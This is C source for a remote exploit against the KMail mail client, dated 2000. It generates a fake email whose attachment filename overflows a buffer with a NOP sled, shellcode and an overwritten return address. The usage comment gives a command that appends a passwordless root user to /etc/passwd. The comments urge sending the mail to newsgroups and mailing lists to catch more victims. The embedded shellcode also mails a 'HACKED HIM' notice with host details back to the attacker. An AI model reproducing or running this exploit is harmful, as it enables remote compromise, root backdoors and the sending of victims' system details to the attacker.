// Remote Exploit For:
// KMAIL CONTENT DISPOSITION BUG
//
// Coded By Crashkiller <pawq@blue.profex.com.pl> '2000
//                      <crashev@crashev.ebox.pl>
// Bug Found By Crashkiller
//
// PRIVATE!!!!!! - DO NOT DISTRIBUTE IT!!!!!!!!!
//
// 
// Special Thx To: myself :>,BugzPl Team,#hackingpl
//

// Generic Shellcode() by crashkiller
//
// Howto:
// bash$ ./kmailbug pawq@r0x.org "echo pawel::0:0:::/bin/sh>>/etc/passwd" > file
//  Then attach file to some mail and wait for victim to open it.... :>
// I think that good idea is to send mail to some news groups or mail lists
// then its more posibble that someone will read it with kmail.
//
//
// Mail is needed to shellcode becouse if the bug will be exploited on
// victim host then it automaticly send a mail to you :>
//
// Tested on : kmail ver. 1.0.29,1.0.20
//
//
// Crashkiller@pawq
//
//


#include <stdio.h>

char fakemail[]=
"From ???@??? 00:00:00 1997 +0000\n"
"From: Crashkiller <pawq@eno.qrw.aa>\n"
"Reply-To: pawq@eno.qrw.aa\n"
"Organization: wusTanges.org\n"
"To: pawq@hackuje.kmaila.po.raz.kolejny.eu.org\n"
"Subject: Kocham ciebie ty moje kochanie\n"
"Date: Wed, 14 Jun 2000 20:01:47 +0200\n"
"X-Mailer: KMail [version 1.0.29]\n"
"Content-Type: Multipart/Mixed;\n"
"  boundary=\x22"
"Boundary-=_nWlrBbmQBhCDarzOwKkYHIDdqSCD\x22\n"
"MIME-Version: 1.0\n"
"Message-Id: <00061420023200.03402@WusTanges.org>\n"
"Status: RO\n"
"X-Status: Q\n"
"\n"
"\n"
"--Boundary-=_nWlrBbmQBhCDarzOwKkYHIDdqSCD\n"
"Content-Type: text/plain\n"
"Content-Transfer-Encoding: 8bit\n"
"\n"
"\n"
"Ten tego tamtego ma sie rozumiec.\n"
"\n"
"-- \n"
"\n"
"Save YourSelf And Stay Cool\n"
"Crashkiller\n"
"CYa\n"
"\n"
"+------------------------------------------+\n"
"\n"
"--Boundary-=_nWlrBbmQBhCDarzOwKkYHIDdqSCD\n"
"Content-Type: application/x-zip;\n"
"  name=\x22 crack1.zip\x22\n"
"Content-Transfer-Encoding: base64\n"
"Content-Disposition: attachment; filename=";

char code[]=
"\xeb\x73\x5e\x31\xd2\x53\x88\x56\x20\x31\xc9\x89\xf3\xb1\x42\xfe\xc6\xb2\xc0"
"\x31\xc0\x80\xea\xbb\x88\xd0\xcd\x80\x89\xc2\x89\xc3\x59\x52\x80\x6e\x34\x58"
"\xc6\x46\x45\x22\xc6\x46\x5f\x22\x80\x6e\x78\x58\x8d\x4e\x2b\x31\xc0\x80\x6e"
"\x27\x5e\x8a\x46\x27\x31\xd2\x80\x6e\x2a\x4f\xb2"
"\x4e" // 4e - pozycja 69 - dlugosc zapisu
"\xcd\x80\x5b\x31\xc0\x80\x6e\x28\x5c\x8a\x46\x28\xcd\x80\x89\x76\x21\x31\xc0"
"\x89\x46\x25\x89\xf3\x8d\x4e\x21\x8d\x56\x25\x80\x6e\x29\x57\x8a\x46\x29\xcd"
"\x80\x31\xc0\x31\xd2\xfe\xc0\xcd\x80\xe8\x88"
"\xff\xff\xff/tmp/roxsploitforkdebugattacknowbbbbbbbbbbb#!/bin/shbecho . |mail -s fHACKED HIM $SYS $HOSTANMEf aaaaaaaaaaaaaaaaaaaaaaab";


void logo() {
fprintf(stderr,"+------------------------------------+\n");
fprintf(stderr,"|          Kmail Remote Exploit      |\n");
fprintf(stderr,"|       COded By Crashkiller'2000    |\n");
fprintf(stderr,"+------------------------------------+\n\n");
}

main(int argc,char *argv[]) {
char lame[40];
int z=0;
char buf[4];
int a,b=0,c;
memset(lame,0x0,sizeof(lame));
if (argc<2) { logo();fprintf(stderr,"Try: %s <email@address>(only 23 chars) <command>\n\n",argv[0]);exit(-1);}
if (argc>2) b=strlen(argv[2]);
if (strlen(argv[1])>23) { fprintf(stderr,"Email address can be only 23 bytes long !!! \n");exit(-1);}
printf("%s",fakemail);
for (a=0;a<=90+150-25-b;a++) { printf("%c",0x90);}
strcpy(lame,argv[1]);

for(a=0;a<=strlen(lame);a++) code[219+a]=lame[a];
for(a=0;a<=23-strlen(lame);a++) code[219+a+strlen(lame)]=0x20;
code[219+23]='b';
    fprintf(stderr,"Outbuf  is : %d \n",90+150-25-b+strlen(code)+22);
if (argc>2) 
{ 
    fprintf(stderr,"Command is : %s \n",argv[2]);
    code[69]=78+strlen(argv[2]);
    printf("%s",code);
    printf("%s",argv[2]);
} else {
printf("%s",code); //no commands
}
    fprintf(stderr,"Code len is : %d \n",code[69]);

for (a=0;a<=22;a++) {printf("%c",0x41);}

buf[4]=0x00;
buf[3]=0xbf;
buf[2]=0xff;
buf[1]=0xf2;
buf[0]=0x6b;
printf("%s",buf); // overwritting ebp || trashing couse we dont need it
printf("%s",buf); // overwritting ret address
printf("%c",0x22);
printf("\n\n");
//printf("--8323328-1050044330-949002172=:3383--\n\n");
printf("--Boundary-=_nWlrBbmQBhCDarzOwKkYHIDdqSCD--\n\n");
printf("Shellcode : %d \n",strlen(code)); // not needed

}